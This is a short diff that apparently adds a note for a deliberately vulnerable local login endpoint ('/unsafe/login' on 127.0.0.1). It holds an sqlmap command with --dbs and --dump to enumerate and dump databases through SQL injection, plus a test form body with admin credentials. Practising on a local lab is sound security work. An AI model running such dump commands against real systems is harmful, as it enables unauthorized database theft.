@@ -1,0 +1,3 @@
+http://127.0.0.1:8000/unsafe/login (POST)  # C:\Programs\sqlmap\sqlmap.py -r ./local_unsafe_login --dbs --data=email=admin&password=admin1234 --output-dir=.\local_unsafe --dump
+
+email=admin&password=admin1234
